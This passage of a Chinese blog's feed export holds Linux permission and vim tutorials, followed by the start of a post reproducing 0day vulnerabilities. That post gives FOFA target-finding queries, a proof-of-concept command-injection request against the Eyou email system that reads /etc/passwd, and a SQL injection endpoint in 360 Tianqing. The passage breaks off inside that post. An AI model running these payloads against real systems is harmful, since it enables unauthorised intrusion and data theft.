title="三、文件和目录权限"></a>三、文件和目录权限</h2><h3 id="3-1-文件的权限"><a href="#3-1-文件的权限" class="headerlink" title="3.1    文件的权限"></a>3.1    文件的权限</h3><pre><code>每个文件都有其所有者(u:user)、所属组(g:group)和其他人(o:other)对它的操作权限，a:all则同时代表这3者。权限包括读(r:read)、写(w:write)、执行(x:execute)。在不同类型的文件上读、写、执行权限的体现有所不同，所以目录权限和普通文件权限要区分开来。</code></pre><p><strong>在普通文件上：</strong></p><pre><code>r：可读，可以使用类似cat等命令查看文件内容；读是文件的最基本权限，没有读权限，普通文件的一切操作行为都被限制。w：可写，可以编辑此文件；x：可执行，表示文件可由特定的解释器解释并运行。可以理解为windows中的可执行程序或批处理脚本，双击就能运行起来的文件。</code></pre><p><strong>在目录上：</strong></p><pre><code>r：可以对目录执行ls以列出目录内的所有文件；读是文件的最基本权限，没有读权限，目录的一切操作行为都被限制。w：可以在此目录创建或删除文件/子目录；x：可进入此目录，可使用ls -l查看文件的详细信息。可以理解为windows中双击就进入目录的动作。</code></pre><p>如果目录没有x权限，其他人将无法查看目录内文件属性(只能查看到文件类型和文件名，至于为什么，见后文)，所以一般目录都要有x权限。而如果只有执行却没有读权限，则权限拒绝。</p><pre><code>一般来说，普通文件的默认权限是644(没有执行权限)，目录的默认权限是755(必须有执行权限，否则进不去)，链接文件的权限是777。当然，默认文件的权限设置方法是可以通过umask值来改变的。</code></pre><h3 id="3-2-权限的表示方法"><a href="#3-2-权限的表示方法" class="headerlink" title="3.2    权限的表示方法"></a>3.2    权限的表示方法</h3><p>权限的模式有两种体现：数字体现方式和字符体现方式。</p><p>权限的数字表示：”-“代表没有权限,用0表示。</p><p>​        r—–4</p><p>​        w—–2</p><p>​        x—–1</p><pre><code>例如：rwx rw- r--对应的数字权限是764，732代表的权限数值表示为rwx -wx -w-。</code></pre><h3 id="3-3-chmod修改权限"><a href="#3-3-chmod修改权限" class="headerlink" title="3.3    chmod修改权限"></a>3.3    chmod修改权限</h3><p>能够修改权限的人只有文件所有者和超级管理员。</p><pre><code>chmod [OPTION]... MODE[,MODE]... FILE...chmod [OPTION]... num_mode FILE...chmod [OPTION]... --reference=RFILE FILE...选项说明：--reference=RFILE：引用某文件的权限作为权限值-R：递归修改，只对当前已存在的文件有效</code></pre><p>(1). 使用数值方式修改权限</p><pre><code>shell&gt; chmod 755 /tmp/a.txt</code></pre><p>(2). 使用字符方式修改权限</p><p>由于权限属性附在文件所有者、所属组和其它上，它们三者都有独立的权限位，所有者使用字母”u”表示，所属组使用”g”来表示，其他使用”o”来表示，而字母”a”同时表示它们三者。所以使用字符方式修改权限时，需要指定操作谁的权限。</p><blockquote><p>chmod   [ugoa]   [+ - =]   [权限字符] 文件/目录名</p><p>“+”是加上权限，”-“是减去权限，”=”是直接设置权限</p></blockquote><pre><code>[root@xuexi tmp]# chmod u-x,g-x,o-x test        # 将ugo都去掉x权限，等价于chmod -x test[root@xuexi tmp]# chmod a+x test                # 为ugo都加上x权限，等价于chmod +x test</code></pre><h3 id="3-4-chgrp"><a href="#3-4-chgrp" class="headerlink" title="3.4    chgrp"></a>3.4    chgrp</h3><p>更改文件和目录的所属组，要求组已经存在。</p><p>注意，对于链接文件而言，修改组的作用对象是链接的源文件，而非链接文件本身。</p><pre><code>chgrp [OPTION]... GROUP FILE...chgrp [OPTION]... --reference=RFILE FILE..选项说明：-R：递归修改--reference=dest_file  file_list：引用某文件的group作为文件列表的组,即将file文件列表的组改为dest_file的组</code></pre><h3 id="3-5-chown"><a href="#3-5-chown" class="headerlink" title="3.5     chown"></a>3.5     chown</h3><p>chown可以修改文件所有者和所属组。</p><p>注意，对于链接文件而言，默认直接修改源文件，而非修改链接文件本身。</p><pre><code>chown [OPTION]... [OWNER][:[GROUP]] FILE...chown [OPTION]... [OWNER][.[GROUP]] FILE...chown [OPTION]... --reference=RFILE FILE...选项说明：--from=CURRENT_OWNER:CURRENT_GROUP：只修改当前所有者或所属组为此处指定的值的文件--reference=RFILE：引用某文件的所有者和所属组的值作为新的所有者和所属组-R：递归修改。注意，当指定-R时，且同时指定下面某一个选项时对链接文件有不同的行为       -H：如果chown的文件参数是一个链接到目录的链接文件，则穿过此链接文件修改其源目录的所有者和所属组       -L：目录中遇到的所有链接文件都穿越过去，修改它们的源文件的所有者和所属组       -P：不进行任何穿越，只修改链接文件本身的所有者和所属组。(这是默认值)       这3项若同时指定多项时，则最后一项生效</code></pre><p>chown指定所有者和所属组的方式有两种，使用冒号和点。</p><pre><code>shell&gt; chown root.root testshell&gt; chown root:root testshell&gt; chown root test     # 只修改所有者shell&gt; chown :root test    # 自修改组shell&gt; chown .root test</code></pre><h3 id="3-6-umask说明"><a href="#3-6-umask说明" class="headerlink" title="3.6    umask说明"></a>3.6    umask说明</h3><p>umask值用于设置用户在创建文件时的默认权限。</p><pre><code>对于root用户(实际上是UID小于200的user)，系统默认的umask值是022；对于普通用户和系统用户，系统默认的umask值是002。</code></pre><p>默认它们的设置是写在/etc/profile和/etc/bashrc两个环境配置文件中。</p><pre><code>shell&gt; grep -C 5 -R 'umask 002'  /etc | grep 'umask 022'  /etc/bashrc-       umask 022/etc/csh.cshrc-    umask 022/etc/profile-      umask 022</code></pre><p>相关设置项如下：</p><pre><code>if [ $UID -gt 199 ] &amp;&amp; [ "`id -gn`" = "`id -un`" ]; then   umask 002else   umask 022fi</code></pre><p>执行umask命令可以查看当前用户的umask值。</p><pre><code>[root@xuexi tmp]# umask0022[test@xuexi tmp]$ umask0002</code></pre><pre><code>执行umask num可以临时修改umask值为num，但这是临时的，要永久有效，需要写入到环境配置文件中，至于写入到/etc/profile、/etc/bashrc、~/.bashrc还是~/.bash_profile中，看你自己的需求了。不过一般来说，不会去永久修改umask值，只会在特殊条件下临时修改下umask值。</code></pre><p>umask是如何决定创建文件的默认权限的呢？</p><p>如果创建的是目录，则使用777-umask值，如root的umask=022，则root创建目录时该目录的默认权限为777-022=755，而普通用户创建目录时，权限为777-002=775.</p><p>如果创建的是普通文件，在Linux中，深入贯彻了一点：文件默认不应该有执行权限，否则是危险的。所以在计算时，可能会和想象中的结果不一样。如果umask的三位都为偶数，则直接使用666去减掉umask值，因为6减去一个偶数还是偶数，任何位都不可能会有执行权限。如root创建普通文件时默认权限为666-022=644，而普通用户创建普通文件时默认权限为666-002=664。</p><p>如果umask值某一位为奇数，则666减去umask值后再在奇数位上加1。如umask=021时，创建文件时默认权限为666-021=645，在奇数位上加1，则为646。</p><pre><code>[test@xuexi tmp]$ umask 021[test@xuexi tmp]$ touch b.txt[test@xuexi tmp]$ ls -l b.txt-rw-r--rw- 1 test test 0 Jun  7 12:02 b.txt</code></pre><p>总之计算出后默认都是没有执行权限的。</p><h3 id="3-7-文件的扩展ACL权限"><a href="#3-7-文件的扩展ACL权限" class="headerlink" title="3.7    文件的扩展ACL权限"></a>3.7    文件的扩展ACL权限</h3><p>在计算机相关领域，所有的ACL(access control list)都表示访问控制列表。</p><p>文件的owner/group/others的权限就是一种ACL，它们是基本的ACL。很多时候，只通过这3个权限位是无法完全合理设置权限问题的，例如如何仅设置某单个用户具有什么权限。这时候需要使用扩展ACL。</p><pre><code>扩展ACL是一种特殊权限，它是文件系统上功能，用于解决所有者、所属组和其他这三个权限位无法合理设置单个用户权限的问题。所以，扩展ACL可以针对单一使用者，单一档案或目录里的默认权限进行r,w,x的权限规范。需要明确的是，扩展ACL是文件系统上的功能，且工作在内核，默认在ext4/xfs上都已开启。</code></pre><h4 id="3-7-1-查看文件系统是否开启ACL功能"><a href="#3-7-1-查看文件系统是否开启ACL功能" class="headerlink" title="3.7.1    查看文件系统是否开启ACL功能"></a>3.7.1    查看文件系统是否开启ACL功能</h4><p>对于ext家族的文件系统来说，要查看是否开启acl功能，使用dumpe2fs导出文件系统属性即可。</p><pre><code>shell&gt; dumpe2fs -h /dev/sda2 | grep -i acldumpe2fs 1.41.12 (17-May-2010)Default mount options:    user_xattr acl</code></pre><p>对于xfs文件系统，则没有直接的命令可以输出它的相关信息，需要使用dmesg来查看。其实无需关注它，因为默认xfs会开启acl功能。</p><pre><code>shell&gt; dmesg | grep -i acl[    1.465903] systemd[1]: systemd 219 running in system mode. (+PAM +AUDIT +SELINUX +IMA -APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ -LZ4 -SECCOMP +BLKID +ELFUTILS +KMOD +IDN)[    2.517705] SGI XFS with ACLs, security attributes, no debug enabled</code></pre><p>开启ACL功能后，不代表就使用ACL功能。是否使用该功能，不同文件系统控制方法不一样，对于ext家族来说，通过mount挂载选项来控制，而对于xfs文件系统，系统默认已经开启了ACL。</p><p>启用：mount –o remount,acl /mnt/sdb1</p><p>取消：mount –o remount,noacl /mnt/sdb1</p><h4 id="3-7-2-设置和查看ACL"><a href="#3-7-2-设置和查看ACL" class="headerlink" title="3.7.2    设置和查看ACL"></a>3.7.2    设置和查看ACL</h4><p><strong>设置使用setfacl命令。</strong></p><pre><code>setfacl [options] u:[用户列表]:[rwx] 目录/文件名    # 对用户设置使用usetfacl [options] g:[组列表]:[rwx]   目录/文件名    # 对组设置使用g选项说明：-m：设定ACL权限(modify)-x：删除指定的ACL权限，可以指定用户、组和文件来删除(remove)-b：删除所有的ACL权限-d：设定默认ACL权限，只对目录有效，设置后子目录(文件)继承默认ACL，只对未来文件 有效-k：删除默认ACL权限-R：递归设定ACL权限，只对目录有效，只对已有文件有效</code></pre><p><strong>查看使用getfacl命令</strong></p><blockquote><p>getfacl filename</p></blockquote><p><strong>案例：</strong></p><p>假设现有目录/data/videos专门存放视频，其中有一个a.avi的介绍性视频。该目录的权限是750。现在有一个新用户加入，但要求该用户对该目录只有查看的权限，且只能看其中一部视频a.avi，另外还要求该用户在此目录下没有创建和删除文件的权限。</p><p>1.准备相关环境。</p><pre><code>shell&gt; mkdir -p /data/videosshell&gt; chmod 750 /data/videosshell&gt; touch /data/videos/{a,b}.avishell&gt; echo "xxx" &gt;/data/videos/a.avishell&gt; echo "xxx" &gt;/data/videos/b.avishell&gt; chown -R root.root /data/videos</code></pre><p>2.首先设置用户test对/data/videos目录有读和执行权限。</p><pre><code>shell&gt; setfacl -m u:test:rx /data/videos</code></pre><p>3.现在test对/data/videos目录下的所有文件都有读权限，因为默认文件的权限为644。要设置test只对a.avi有读权限，先设置所有文件的权限都为不可读。</p><pre><code>shell&gt; chmod 640 /data/videos/*</code></pre><p>4.然后再单独设置a.avi的读权限。</p><pre><code>shell&gt; setfacl -m u:test:r /data/videos/a.avi</code></pre><p>到此就设置完成了。查看/data/videos/和/data/videos/a.avi上的ACL信息。</p><pre><code>shell&gt; getfacl /data/videos/getfacl: Removing leading '/' from absolute path names# file: data/videos/# owner: root# group: rootuser::rwxuser:test:r-x         # 用户test在此文件上的权限是r-xgroup::r-xmask::r-xother::---shell&gt; getfacl /data/videos/a.avigetfacl: Removing leading '/' from absolute path names# file: data/videos/a.avi# owner: root# group: rootuser::rw-user:test:r--         # 用户test在此文件上的权限是r--group::r--mask::r--other::---</code></pre><h4 id="3-7-3-ACL-mask"><a href="#3-7-3-ACL-mask" class="headerlink" title="3.7.3    ACL:mask"></a>3.7.3    ACL:mask</h4><p>设置mask后会将mask权限与已有的acl权限进行与计算，计算后的结果会成为新的ACL权限。</p><p>设定mask的方式为：</p><pre><code>setfacl -m m:[rwx] 目录/文件名</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://images2015.cnblogs.com/blog/733013/201706/733013-20170615004000853-1479223179.png" alt="img"></p><p>注意：默认每次设置文件的acl都会重置mask为此次给定的用户的值。既然如此，要如何控制文件上的acl呢？如果一个文件上要设置多个用户的acl，重置mask后就会对已有用户的acl重新计算，而使得acl权限得不到有效的控制。使用setfacl的”-n”选项，它表示此次设置不会重置mask值。</p><p>例如：</p><p>当前的acl权限：</p><pre><code>shell&gt; getfacl /data/videos                     getfacl: Removing leading '/' from absolute path names# file: data/videos# owner: root# group: rootuser::rwxuser:longshuai:rwxgroup::r-xmask::rwxother::---</code></pre><p>设置mask值为rx。</p><pre><code>shell&gt; setfacl -m m:rx /data/videosshell&gt; getfacl /data/videos       getfacl: Removing leading '/' from absolute path names# file: data/videos# owner: root# group: rootuser::rwxuser:longshuai:rwx              #effective:r-xgroup::r-xmask::r-xother::---</code></pre><p>设置mask后，它提示有效权限是r-x。这是rwx和r-x做与运算之后的结果。</p><p>再设置longshuai的acl为rwx，然后查看mask，会发现mask也被重置为rwx。</p><pre><code>shell&gt; setfacl -m u:longshuai:rwx /data/videosshell&gt; getfacl  /data/videosgetfacl: Removing leading '/' from absolute path names# file: data/videos# owner: root# group: rootuser::rwxuser:longshuai:rwxgroup::r-xmask::rwxother::---</code></pre><p>所以，在设置文件的acl时，要使用-n选项来禁止重置mask。</p><pre><code>shell&gt; setfacl -m m:rx /data/videosshell&gt; setfacl -n -m u:longshuai:rwx /data/videosshell&gt; getfacl  /data/videosgetfacl: Removing leading '/' from absolute path names# file: data/videos# owner: root# group: rootuser::rwxuser:longshuai:rwx              #effective:r-xgroup::r-xmask::r-xother::---</code></pre><h4 id="3-7-4-设置递归和默认ACL权限"><a href="#3-7-4-设置递归和默认ACL权限" class="headerlink" title="3.7.4     设置递归和默认ACL权限"></a>3.7.4     设置递归和默认ACL权限</h4><p>递归ACL权限只对目录里已有文件有效，默认权限只对未来目录里的文件有效。</p><p>设置递归ACL权限：</p><pre><code>setfacl -m u:username:[rwx] -R 目录名</code></pre><p>设置默认ACL权限：</p><pre><code>setfacl -m d:u:username:[rwx] 目录名</code></pre><h4 id="3-7-5-删除ACL权限"><a href="#3-7-5-删除ACL权限" class="headerlink" title="3.7.5     删除ACL权限"></a>3.7.5     删除ACL权限</h4><pre><code>setfacl -x u:用户名 文件名       # 删除指定用户ACLsetfacl -x g:组名 文件名         # 删除指定组名ACLsetfacl -b 文件名                # 指定文件删除ACL，会删除所有ACL</code></pre><h3 id="3-8-文件隐藏属性"><a href="#3-8-文件隐藏属性" class="headerlink" title="3.8 文件隐藏属性"></a>3.8 文件隐藏属性</h3><p>chattr：change file attributes</p><p>lsattr：list file attributes</p><pre><code>chattr [+ - =] [ai] 文件或目录名</code></pre><p>常用的参数是a(append，追加)和i(immutable，不可更改)，其他参数略。</p><p>设置了a参数时，文件中将只能增加内容，不能删除数据，且不能打开文件进行任何编辑，哪怕是追加内容也不可以，所以像sed等需要打开文件的再写入数据的工具也无法操作成功。文件也不能被删除。只有root才能设置。</p><p>设置了i参数时，文件将被锁定，不能向其中增删改内容，也不能删除修改文件等各种动作。只有root才能设置。可以将其理解为设置了i后，文件将是永恒不变的了，谁都不能动它。</p><p>例如，对/etc/shadow文件设置i属性，任何用户包括root将不能修改密码，而且也不能创建用户。</p><pre><code>shell&gt; chattr +i /etc/shadow</code></pre><p>此时如果新建一个用户。</p><pre><code>shell&gt; useradd newlongsuaishell&gt; useradd: cannot open /etc/shadow        # 提示文件不能打开，被锁定了</code></pre><p>lsattr查看文件设置的隐藏属性。</p><pre><code>shell&gt; lsattr /etc/shadow----i--------e- /etc/shadow         # i属性说明被锁定了，e是另一种文件属性，忽略它</code></pre><p>删除隐藏属性：</p><pre><code>shell&gt; chattr -i /etc/shadowshell&gt; lsattr /etc/shadow-------------e- /etc/shadow</code></pre><p>再来一例：</p><pre><code>shell&gt; chattr +a test1.txt        # 对test1.txt设置a隐藏属性shell&gt; echo 1234&gt;&gt;test1.txt     # 追加内容是允许的行为shell&gt; cat /dev/null &gt;test1.txt    # 但是清空文件内容是不允许的-bash: test1.txt: Operation not permitted</code></pre><h3 id="3-9-suid-sgid-sbit"><a href="#3-9-suid-sgid-sbit" class="headerlink" title="3.9     suid/sgid/sbit"></a>3.9     suid/sgid/sbit</h3><h4 id="3-9-1-suid"><a href="#3-9-1-suid" class="headerlink" title="3.9.1     suid"></a>3.9.1     suid</h4><p>suid只针对可执行文件，即二进制文件。它的作用是对某个命令(可执行文件)授予所有者的权限，命令执行完成权限就消失。一般是提权为root权限。</p><p>例如/etc/shadow文件所有人都没有权限(root除外)，其他用户连看都不允许。</p><pre><code>shell&gt; ls -l /etc/shadow----------. 1 root root 752 Apr  8 12:42 /etc/shadow</code></pre><p>但是他们却能修改自己的密码，说明他们一定有一定的权限。这个权限就是suid控制的。</p><pre><code>shell&gt; ls -l /usr/bin/passwd-rwsr-xr-x. 1 root root 30768 Feb 22  2012 /usr/bin/passwd</code></pre><p>其中的”s”权限就是suid，它出现在所有者位置上(是root)，其他用户执行passwd命令时，会暂时拥有所有者位的rwx权限，也就是root的权限，所以能向/etc/shadow写入数据。</p><p>suid必须和x配合，如果没有x配合，则该suid是空suid，仍然没有执行命令的权限，所有者都没有了x权限，suid依赖于它所以更不可能有x权限。空的suid权限使用大写的”S”表示。</p><p>数字4代表suid，如4755。</p><h4 id="3-9-2-sgid"><a href="#3-9-2-sgid" class="headerlink" title="3.9.2     sgid"></a>3.9.2     sgid</h4><p>针对二进制文件和目录。</p><ul><li>针对二进制文件时，权限升级为命令的所属组权限。</li><li>针对目录时，目录中所建立的文件或子目录的组将继承默认父目录组，其本质还是提升为目录所属组的权限。此时目录应该要有rx权限，普通用户才能进入目录，如果普通用户有w权限，新建的文件和目录则以父目录组为默认组。</li></ul><p>以2代表sgid，如2755，和suid组合如6755。</p><h4 id="3-9-3-sbit"><a href="#3-9-3-sbit" class="headerlink" title="3.9.3     sbit"></a>3.9.3     sbit</h4><p>只对目录有效。对目录设置sbit，将使得目录里的文件只有所有者能删除，即使其他用户在此目录上有rwx权限，即使是root用户。</p><p>以1代表sbit。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络运维篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vim的使用</title>
      <link href="/posts/627226e0.html"/>
      <url>/posts/627226e0.html</url>
      
        <content type="html"><![CDATA[<h3 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h3><p>用户刚刚启动 vi/vim，便进入了命令模式。</p><p>此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。</p><p>以下是常用的几个命令：</p><pre class="line-numbers language-shell"><code class="language-shell">i 切换到输入模式，以输入字符。 x 删除当前光标所在处的字符。 : 切换到底线命令模式，以在最底一行输入命令。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。<br>命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。</p><h3 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h3><p>在命令模式下按下i就进入了输入模式。</p><p>在输入模式中，可以使用以下按键：</p><pre class="line-numbers language-shell"><code class="language-shell">字符按键以及Shift组合，输入字符 ENTER，回车键，换行 BACK SPACE，退格键，删除光标前一个字符 DEL，删除键，删除光标后一个字符 方向键，在文本中移动光标 HOME/END，移动光标到行首/行尾 Page Up/Page Down，上/下翻页 Insert，切换光标为输入/替换模式，光标将变成竖线/下划线 ESC，退出输入模式，切换到命令模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="底线命令模式"><a href="#底线命令模式" class="headerlink" title="底线命令模式"></a>底线命令模式</h3><p>在命令模式下按下:（英文冒号）就进入了底线命令模式。</p><p>底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</p><p>在底线命令模式中，基本的命令有（已经省略了冒号）：</p><pre class="line-numbers language-shell"><code class="language-shell">q 退出程序w 保存文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>按ESC键可随时退出底线命令模式。</p><h3 id="vim常见用法"><a href="#vim常见用法" class="headerlink" title="vim常见用法"></a>vim常见用法</h3><p><strong>1、打开文件、保存、关闭文件(vi命令模式下使用)</strong></p><pre class="line-numbers language-shell"><code class="language-shell">vi filename //打开filename文件 :w //保存文件 :w vpser.net //保存至vpser.net文件 :q //退出编辑器，如果文件已修改请使用下面的命令 :q! //退出编辑器，且不保存 :wq //退出编辑器，且保存文件 快捷键 ： 强制保存退出 ZZ :wq! 强制退出 ZQ :q!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>2、插入文本或行(vi命令模式下使用，执行下面命令后将进入插入模式，按ESC键可退出插入模式)</strong></p><pre class="line-numbers language-shell"><code class="language-shell">a //在当前光标位置的右边添加文本 i //在当前光标位置的左边添加文本 A //在当前行的末尾位置添加文本 I //在当前行的开始处添加文本(非空字符的行首) O //在当前行的上面新建一行 o //在当前行的下面新建一行 R //替换(覆盖)当前光标位置及后面的若干文本 J //合并光标所在行及下一行为一行(依然在命令模式)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3、移动光标(vi命令模式下使用)</strong></p><p>1、使用上下左右方向键<br>2、命令模式下：h 向左、j 向下 、k 向上、l 向右。<br>空格键 向右、Backspace 向左、Enter 移动到下一行首、- 移动到上一行首。</p><p><strong>4、删除、恢复字符或行(vi命令模式下使用)</strong></p><pre class="line-numbers language-shell"><code class="language-shell">x //删除当前字符 nx //删除从光标开始的n个字符 dd //删除当前行 ndd //向下删除当前行在内的n行 u //撤销上一步操作 U //撤销对当前行的所有操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>5、搜索(vi命令模式下使用)</strong></p><pre class="line-numbers language-shell"><code class="language-shell">/vpser //向光标下搜索vpser字符串 ?vpser //向光标上搜索vpser字符串 n //向下搜索前一个搜素动作 N //向上搜索前一个搜索动作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>6、跳至指定行(vi命令模式下使用)</strong></p><pre class="line-numbers language-shell"><code class="language-shell">n+ //向下跳n行 n- //向上跳n行 nG //跳到行号为n的行 G //跳至文件的底部 gg //跳转到文件第一行行首<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>7、设置行号(vi命令模式下使用)</strong></p><pre class="line-numbers language-shell"><code class="language-shell">:set nu //显示行号 :set nonu //取消显示行号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>8、复制、粘贴(vi命令模式下使用)</strong></p><pre class="line-numbers language-shell"><code class="language-shell">yy //将当前行复制到缓存区 nyy //将当前行向下n行复制到缓冲区。 yw //复制从光标开始到词尾的字符。 nyw //复制从光标开始的n个单词。 y^ //复制从光标到行首的内容。 y$ //复制从光标到行尾的内容。 p //粘贴剪切板里的内容在光标后。 P //粘贴剪切板里的内容在光标前。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>9、替换(vi命令模式下使用)</strong></p><pre class="line-numbers language-shell"><code class="language-shell">:s/old/new //用new替换行中首次出现的old :s/old/new/g //用new替换行中所有的old :n,m s/old/new/g //用new替换从n到m行里所有的old :%s/old/new/g //用new替换当前文件里所有的old<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>10、编辑其他文件</strong></p><pre class="line-numbers language-shell"><code class="language-shell">:e otherfilename //编辑文件名为otherfilename的文件。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>11、修改文件格式</strong></p><pre class="line-numbers language-shell"><code class="language-shell">:set fileformat=unix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><a href="https://imgtu.com/i/cHMT39" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/20/cHMT39.png" alt="cHMT39.png"></a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络运维篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HW期间0day漏洞复现</title>
      <link href="/posts/170ec5d4.html"/>
      <url>/posts/170ec5d4.html</url>
      
        <content type="html"><![CDATA[<h3 id="亿邮电子邮件系统远程命令执行"><a href="#亿邮电子邮件系统远程命令执行" class="headerlink" title="亿邮电子邮件系统远程命令执行"></a>亿邮电子邮件系统远程命令执行</h3><pre class="line-numbers language-python"><code class="language-python">FOFA搜索：body<span class="token operator">=</span><span class="token string">"亿邮电子邮件系统"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>POC：</p><pre class="line-numbers language-python"><code class="language-python">POST <span class="token operator">/</span>webadm<span class="token operator">/</span>?q<span class="token operator">=</span>moni_detail<span class="token punctuation">.</span>do<span class="token operator">&amp;</span>action<span class="token operator">=</span>gragh HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>xContent<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">25</span>Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedUser<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chro·me<span class="token operator">/</span><span class="token number">89.0</span><span class="token punctuation">.</span><span class="token number">4389.114</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>type<span class="token operator">=</span><span class="token string">'|cat /etc/passwd||'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://imgtu.com/i/cBHTC8" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/04/12/cBHTC8.png" alt="cBHTC8.png"></a></p><h3 id="360天擎终端安全管理系统前台SQL注入"><a href="#360天擎终端安全管理系统前台SQL注入" class="headerlink" title="360天擎终端安全管理系统前台SQL注入"></a>360天擎终端安全管理系统前台SQL注入</h3><pre class="line-numbers language-python"><code class="language-python">FOFA搜索：title<span class="token operator">=</span><span class="token string">"360天擎"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注入点ccid：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">/</span>api<span class="token operator">/</span>dp<span class="token operator">/</span>rptsvcsyncpoint?ccid<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问<a href="http://x.x.x.x:x/api/dp/rptsvcsyncpoint?ccid=1，返回的json数据包中包含reason" target="_blank" rel="noopener">http://x.x.x.x:x/api/dp/rptsvcsyncpoint?ccid=1，返回的json数据包中包含reason</a>: “success”，说明存在该漏洞</p><pre class="line-numbers language-python"><code class="language-python">GET <span class="token operator">/</span>api<span class="token operator">/</span>dp<span class="token operator">/</span>rptsvcsyncpoint?ccid<span class="token operator">=</span><span class="token number">1</span> HTTP<span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>x<span class="token punctuation">.</span>xUpgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">89.0</span><span class="token punctuation">.</span><span class="token number">4389.114</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>Accept<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token 